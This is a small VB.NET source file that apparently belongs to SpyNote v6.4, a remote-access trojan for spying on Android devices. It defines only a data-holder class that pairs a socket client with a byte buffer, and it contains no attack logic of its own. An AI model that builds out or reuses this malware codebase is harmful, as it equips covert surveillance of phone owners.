Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Namespace SN
    Public Class PassData
        Public Sub New(ParametersClient As SocketClient, ParametersByte As Byte())
            Me.wait = False
            Try
                Me.client = ParametersClient
                Me.byte_0 = ParametersByte
            Catch ex As Exception
            End Try
        End Sub

        Public wait As Boolean

        Public byte_0 As Byte()

        Public client As SocketClient
    End Class
End Namespace